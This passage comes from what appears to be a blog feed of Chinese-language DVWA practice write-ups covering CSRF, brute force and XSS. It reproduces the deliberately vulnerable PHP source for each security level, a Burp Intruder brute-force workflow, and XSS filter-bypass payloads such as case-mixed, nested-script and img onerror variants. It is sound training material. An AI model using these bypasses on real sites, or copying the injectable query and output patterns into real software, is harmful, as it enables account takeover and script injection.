&amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析关键代码 // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); / Generate Anti-CSRF token generateSessionToken(); 利用PDO技术防御SQL注入，需要输入原密码来进行验证，在不知道原密码的情况下无法进行攻击 $pass_curr = stripslashes( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); CSRF漏洞的分类及检测挖掘方法主要有三种：第一种：请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。 检测方法：网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。 第二种：请求是个POST请求，post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。 检测方法：网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将referer也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个form表单的，然后将服务器form表单的URL作为CSRF攻击进行利用的，或者用js代码生成form表单，或者用ajax实现。 第三种：请求是POST，post请求中没有token参数，但是验证了referer信息。然而可以将post请求改写为get请求，然后通过第一种情况下的那个方法利用。 检测方法：就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用$_POST 而是用的类似于 $_REQUEST这种post，get请求的参数都可以接收的写法。 防护措施主要可以应用以下介绍的几种方法： 限制验证cookie的到期时间：这些cookie的合法时间越短，黑客利用你的Web应用程序的机会就越小。不过，这个时间越短，用户就越不方便。因此，你需要在安全性和方便性之间进行平衡。 执行重要业务之前，要求用户提交额外的信息：要求用户在进行重要业务前输入口令，这可以防止黑客发动CSRF攻击（只要浏览器中没有包含口令），因为这种重要信息无法预测或轻易获得。 使用秘密的无法预测的验证符号：当保存在用户浏览器中的cookie仅由一次会话确认时，CSRF攻击才会有效。所以在每次HTTP请求（当然攻击者无法提前知道）中都有附加的特定会话的信息，这样就可以挫败CSRF攻击。不过，如果这种应用程序存在跨站脚本漏洞，黑客就有可能访问这种验证符号。 使用定制的HTTP报头：如果执行交易的所有请求都使用XMLHttpRequest并附加一个定制的HTTP报头，同时拒绝缺少定制报头的任何请求，就可以用XMLHttpRequest API来防御CSRF攻击。由于浏览器通常仅准许站点将定制的HTTP报头发送给相同站点，从而了防止由CSRF攻击的源站点所发起的交易。 检查访问源的报头：在浏览者发送HTTP请求时，它通常会包含源自访问源报头的URL。理论上讲，你可以使用这些信息来阻止源自其它任何站点（而不是来自Web应用程序自身）的请求。不过，访问源报头并不总是可用的，（例如，有些单位由于私密性的缘故而将它剥离了），或者这个报头容易被欺骗，所以说，这条措施并不真正有效。 参考白帽子挖洞—跨站请求伪造（CSRF）篇 DVWA CSRF 通关教程]]></content>
      <tags>
        <tag>CSRF</tag>
        <tag>DVWA</tag>
        <tag>practice</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-Brute_Force]]></title>
    <url>%2F2018%2F07%2F23%2FDVWA-Brute_Force%2F</url>
    <content type="text"><![CDATA[Vulnerability: Brute ForceLow 源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Get username $user = $_GET[ &apos;username&apos; ]; // Get password $pass = $_GET[ &apos;password&apos; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析正常的登入界面，没有验证码和次数限制，没有任何放爆破机制，且存在SQL注入。 漏洞利用使用Burpsuit爆破1、brupsuit抓包右键发送到Intruder2、Attack type 选 Cluster bombcluster bomb - 每个变量对应一个字典，并且进行交叉式破解，尝试各种组合。适用于用户名+密码的破解 3、对应变量加$4、设置payload 5、结果 Middle源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } 分析在Low的基础上加了mysql_real_escape_string函数，对特殊符号转义，最后的sleep(2)对防爆破意义不大。 漏洞利用这里使用Burpsuite爆破与Low级别的的方式一样 High源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。 同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。 漏洞利用方式一 Burpsuit1、设置Opsitions和 Attack type 2、设置Payload 3、user_token就不是单纯的使用字典了，而是需要从我们的页面中获取，burpsuite正好提供了这个功能，方法如下：找到option-&gt;grep extract,按照下图进行操作 4、结果这里用burpsuit爆破比较慢，不能使用多线程，而且有个随机的Tocken，爆破出来的几率很小，但是如果我们知道用户名胡密码中的任意一个，那么只需要跑一个token和密码（用户名）就很轻松，我们可以用攻击类型pitchfork,很容易就可以爆破出来。 方式二 Python脚本Impossible源代码&lt;?php if( isset( $_POST[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_POST[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_POST[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &apos;last_login&apos; ]; $last_login = strtotime( $last_login ); $timeout = strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow = strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&apos;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ &apos;avatar&apos; ]; $failed_login = $row[ &apos;failed_login&apos; ]; $last_login = $row[ &apos;last_login&apos; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。 同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>Brute-force</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-XSS]]></title>
    <url>%2F2018%2F07%2F08%2FDVWA-XSS%2F</url>
    <content type="text"><![CDATA[XSS(Cross-Site Script)原理攻击者将恶意代码插入到web页面，若服务器端未进行有效过滤，当用户浏览该页面时，插入的代码就会在用户的浏览器中执行 攻击发生在客户端，攻击目标是最终用户的浏览器 恶意代码通常为：危险的HTML标签、客户端脚本、能执行JS的容器等 存在用户输入点的位置，都可能存在跨站漏洞 分类DOM型：页面本身包含一些DOM对象的操作，如果未对输入的参数进行处理，可通过改变DOM结构形成XSS 反射型：用户输入的数据(html或js代码)经服务端反射回客户端，反射后让浏览器去执行 存储型：恶意的脚本代码存储在服务端(文件或数据库)，正常用户请求时，站点从数据库中读取了相应的非法数据，并展示在当前页面 Vulnerability: Reflected Cross Site Scripting (XSS)Low关键代码Reflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Feedback for end user echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } ?&gt; 分析通过GET提交的参数name在没有任何安全验证（过滤）的情况下直接输出 Payload:&lt;script&gt;alert(/xss/)&lt;/script&gt; 验证成功 利用MediumReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析使用函数str_replace函数(该函数区分大小写，而且只替换一次)将参数name中的&lt;script字符串替换为空，这里使用大小写绕过或者嵌套 Payload&lt;Script&gt;alert(/xss/)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; HighReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析使用正则表达式将&lt;script顺序出现的大小写或者嵌套形式出现的过滤掉,这里只是script标签，可以使用一些能够执行JavaScript代码的JavaScript事件 Payload&lt;img src=# onerror=alert(&quot;xss&quot;)&gt; 通过加载一个不存在的图片出错出发javascript onerror事件，验证存在XSS ImpossibleReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析这里对参数name进行了预定义字符实体化 Vulnerability: Stored Cross Site Scripting (XSS)LowStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析前面进行了数据库连接操作，对参数mtxMessage传递的数据只进行了stripslashes()函数（删除反斜杠）处理，对txtname参数的长度为10，然后就将两个参数传递的数据存储到了数据库中 Payload&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 可以看到每次点到这个页面时都会触发 MediumStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析关键函数trim() 用于去除字符串两端的空白字符 strip_tags() 剥去字符串中的 HTML、XML 以及 PHP 的标签。 addslashes() 返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。 htmlspecialchars() 把预定义的字符 &quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）转换为 HTML 实体， 转换为实体常用于防止浏览器将其用作 HTML 元素 str_replace(&apos;&lt;script&gt;&apos;) 以其他字符替换字符串中的一些字符（区分大小写）且只替换一次 首先对传进来的值去除了两端的空白字符，将message变量的值中的预定义字符前添加了反斜杠，并转为了html实体，变量name把&lt;script替换了一次，且不区分大小写,这里要注意在客户端限制了输入的字符数，我们看到两个输入框，但是对name的限制更小，用firebug把输入十个字符的限制在客户端改成100。 Payload&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; &lt;Script&gt;alert(/xss/)&lt;/script&gt; HighStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析对参数message，去除两端的空白字符，对预定义字符转义，并转换为html实体对参数name，使用正则把顺序为&lt;script的字符串的大小写，嵌套都过滤了，这里使用能够执行JavaScript的事件来执行,绕过方法与与前面反射型相似，通过不存在的图片触发 onerror事件执行 Payload&lt;img src=# onerror=&quot;alert(/high xss/)&quot;&gt; ImpossibleStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析此处将message和name两个参数全部进行了html实体化，且绑定了变量将sql语句预处理 Vulnerability: DOM Based Cross Site Scripting (XSS)Low在服务端没有代码，客户端的源代码 &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option 